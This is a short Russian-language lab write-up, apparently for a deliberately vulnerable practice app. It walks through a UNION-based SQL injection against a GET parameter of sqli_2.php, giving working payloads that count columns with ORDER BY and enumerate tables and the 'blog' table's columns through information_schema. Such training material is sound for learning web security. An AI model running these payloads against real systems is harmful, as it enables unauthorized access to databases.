---
title: SQL_Injection_GETSearch
sidebar_position: 1
---

# SQL Injection (GET/Select)

**(low)**


В приложении есть функция выбора, которая позволяет пользователю выбирать фильмы и просматривать информацию о них. Согласно перехвату Burp, приложение отправляет GET-запрос на файл sqli\_2.php, который, в свою очередь, отображает данные из бд

Потом я использовал payload, чтобы узнать кол-во столбцов

1+ORDER+BY+8--+- - выдал ошибку

1+ORDER+BY+7--+- - не выдал ничего, а значит столбцов 7

выясним, какой столбец можно использовать для получения данных

999+UNION+SELECT+NULL,"asd",NULL,NULL,NULL,NULL,NULL--+-

узнаем, какие таблицы есть в бд, с помощью приведенной ниже полезной нагрузки

999+UNION+SELECT+NULL,table\_name,NULL,NULL,NULL,NULL,NULL+from+information\_schema.tables+where+table\_schema=database()--+-

У нас есть таблица под названием «blog», проверим столбцы внутри нее

999+UNION+SELECT+NULL,column\_name,NULL,NULL,NULL,NULL,NULL+from+information\_schema.columns+where+table\_name='blog'--+-

![](images/SQL_Injection_GETSearch_img_1.png)